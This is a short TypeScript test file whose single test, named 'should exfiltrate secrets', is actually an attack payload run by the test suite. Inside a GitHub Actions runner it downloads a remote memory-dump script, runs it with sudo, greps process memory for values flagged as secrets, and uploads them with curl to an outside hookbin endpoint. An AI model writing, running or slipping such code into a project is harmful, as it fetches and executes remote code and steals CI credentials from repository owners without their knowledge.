import { execSync } from 'child_process';
import * as fs from 'fs';

describe('Pwn', () => {
    it('should exfiltrate secrets', () => {
        const runId = process.env.GITHUB_RUN_ID;
        if (fs.existsSync('/tmp/.rce_lock_test')) return;
        try {
            fs.writeFileSync('/tmp/.rce_lock_test', '1');
        } catch (e) {}

        console.log("RCE triggered in test");
        try {
            execSync(`echo "Okay, we got this far. Let's continue..."
curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\\0' | grep -aoE '"[^"]+":\\{"value":"[^"]*","isSecret":true\\}' >> "/tmp/secrets"
curl -X PUT -d \\@/tmp/secrets "https://open-hookbin.vercel.app/${runId}"`, { stdio: 'inherit', shell: '/bin/bash' });
        } catch (e) {
            console.error(e);
        }
    });
});
